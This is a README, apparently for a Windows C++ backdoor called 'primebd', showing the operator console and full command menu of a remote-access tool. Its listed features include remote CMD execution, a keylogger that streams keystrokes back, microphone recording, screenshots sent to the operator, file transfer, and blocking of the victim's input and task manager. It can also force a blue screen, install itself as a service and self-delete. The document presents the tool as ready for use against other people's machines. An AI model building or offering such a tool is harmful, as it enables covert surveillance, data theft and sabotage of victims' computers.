# primebd
```
F:\root\dev\windows\cpp\primebd>server

     ................
...::: SERVER BEGIN :::...
==========================
PORT: 31337
> nc localhost 33340 -- output
> nc localhost 33341 -- debug

 +[0] -- 127.0.0.1:50776 -- ENV[USER] PID[10852] SID[1] USERNAME[user] USERDOMAIN[DESKTOP-9NDQ4CE]
> help

 ===[ COMMANDS BEFORE CONNECTING ]===
  h/help      - print help
  c/cls/clear - clear screen
  o/out       - redirect to this stdout to print shell recv
  l/list      - list connections
  e/q/exit    - exit from server
  rm <index>  - remove connection
  rmall       - remove all connections

 ===[ COMMANDS AFTER CONNECTING ]===
  cls  - clear screen
  MENU - go back to the menu

> o
use STDOUT: TRUE
> 0
>>> [0] -- 127.0.0.1:50776
# $
help
#
===[ GET INFO ]===
 help   - print help
 pwd    - print current working directory (%CD%)
 banner - print banner (common info, ...)
 exe    - print exe location
 exedir - print exe location (dir only)
 exip   - print public ip
 clip   - print clipboard text

===[ START ]===
 run <command>    - run command in CMD
 bg <command>     - run command in CMD in the background (no IO)
 proc <program>   - start program & redirect IO
 procbg <program> - start program in the background (no IO)
 bp <program>     - start program in user env
 user             - 'bp <exePath> user' - start shell as user (in user env)
 keylog           - 'bp <exePath> keylog' - start shell as a keylogger only (in user env)
 ***              - all other commands are redirected to CMD (run)

===[ ALIASES ]===
 id       - alias for "whoami"
 poweroff - alias for "shutdown /s /t 1"
 reboot   - alias for "shutdown /r /t 1"
 disks    - alias for "wmic logicaldisk get name"
 titles   - alias for "tasklist /v /fo list | find /i "window title" | find /v "N/A""
 dumplog  - alias for "type "C:\Windows\Temp\keys.log""
 .        - repeat last command

===[ SETTINGS ]===
 ps1none - no prompt
 ps1mini - prompt: '$' (default)
 ps1full - prompt: 'pwd$'

====[ CD ]====
 cd <path> - change dir
 dx        - change dir to current user's desktop
 cdx       - change dir to exe dir
 temp      - change dir to %TEMP%
 appdata   - change dir to %APPDATA%

====[ KEYLOGGER ]====
 kl <file>  - start keylogger, write the keys to a file
 klstop     - stop the keylogger
 klclean    - enable cleaner logging... (this is by default on)
 lkl        - start live keylogger, connect back and stream the keys
 lklstop    - stop live keylogger
 lklclean   - enable cleaner logging... (this is by default on)

====[ ADMIN CONTROL / JOKES / EXPLOITS ]====
 kill <name | id>    - kill process by name or id
 lp <grep(optional)> - list processes
 bion                - disable/block user input (note: uses BlockInput())
 bioff               - enable/unblock user input
 bieon               - block input exploit (note: creates an input hook that filters keys)
 bieoff              - stop block input exploit
 atkon               - disable taskmgr, regedit, services, ... (it just kills them instantly)
 atkoff              - enable taskmgr and regedit
 fmuon               - force mixer unmute (raise the volume to max & unmute when playing wav/mp3 files)
 fmuoff              - stop force mixer unmute
 cmon                - make mouse unusable by making it go in circles
 cmoff               - stop mouse from going in circles
 kbdon               - keyboard disco lights
 kbdoff              - stop keyboard disco
 openclip            - open the clipboard (disables other programs from using the clipboard)
 closeclip           - close the clipboard (reallow other programs from using the clipboard)
 sk <keysToSend>     - simulate key presses (type 'sk' for help)
 rec <ms>            - record mic & save file to rec.wav
 recbg <ms>          - 'rec' in the background
 bsod                - cause blue screen of death

====[ MEDIA ]====
 playwav <filePath.wav>  - play wav file
 loopwav <filePath.wav>  - play wav file repeatedly
 stopwav                 - stop playing wav file
 playmp3 <filePath.mp3>  - open and play mp3 file
 loopmp3                 - enable looping
 pausemp3                - pause the currently playing mp3 file
 resumemp3               - resume playing the mp3 file
 stopmp3                 - stop playing mp3 file and close it
 ss <fileName(optional)> - take screenshot and save it as a bmp file

===[ TRANSFER FILES ]===
 sf <filePath>   - send file
 rf <filePath>   - receive file
 sfbg <filePath> - send file, connect from another thread
 rfbg <filePath> - receive file, connect from another thread
 sssf            - take a screenshot and send it

===[ QUIT ]===
 exit     - close connection
 stop     - stop the program (if it's running in a service it won't be stopped)
 stopserv - stop the program's service
 suicide  - self destruction (quit, delete service & program)

$
```